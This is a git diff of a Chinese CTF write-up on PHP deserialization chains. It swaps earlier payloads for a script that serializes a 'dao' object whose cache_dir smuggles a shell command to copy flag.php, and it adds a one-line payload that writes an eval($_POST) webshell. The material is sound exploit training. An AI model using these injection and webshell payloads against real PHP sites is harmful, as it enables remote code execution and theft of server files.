@@ -174,51 +174,36 @@ echo base64_encode(serialize($a));
 
 所以是两条链子，一个打`service`一个打`dao`
 
-第一条
+---
+一开始我误以为 service 这条也可以打，因为当时我没看到有`__wakeup`方法，
 
-```php
-<?php
-class service{
-	private $dao;
-	public function __construct(){
-        $this->dao=new dao();
-    }
-}
-class dao{
-	private $config;
-	private $conn;
-	public function __construct(){
-        $this->config=new config();
-    }
-
-}
-class config{
-	
-	public $cache_dir = ';echo "<?php eval(\$_POST[a]);?>" > /var/www/html/a.php;';
-}
-$a=new service();
-echo base64_encode(serialize($a));
-```
-
-第二条
+直接写入文件读取 flag
 
 ```php
 <?php
 class dao{
-	private $config;
-	private $conn;
-	public function __construct(){
-        $this->config=new config();
-    }
+    private $config;
+    private $conn;
 
+    public function __construct(){
+        $this->config = new config();
+        $this->conn = null;
+    }
 }
+
 class config{
-	
-	public $cache_dir = ';echo "<?php eval(\$_POST[a]);?>" > /var/www/html/a.php;';
+    public $cache_dir = 'x;cat /var/www/html/flag.php > /var/www/html/cache/sds_test.txt 2>&1;#';
 }
-$a=new dao();
-echo base64_encode(serialize($a));
+
+$a = new dao();
+echo rawurlencode(base64_encode(serialize($a)));
 ```
+
+![](assets/15.png)
+
+或者写 webshell
+`public $cache_dir = 'x;echo "<?php eval(\$_POST[\'a\']);?>" > /var/www/html/cache/a.php;#';`
+
 
 # web308
 
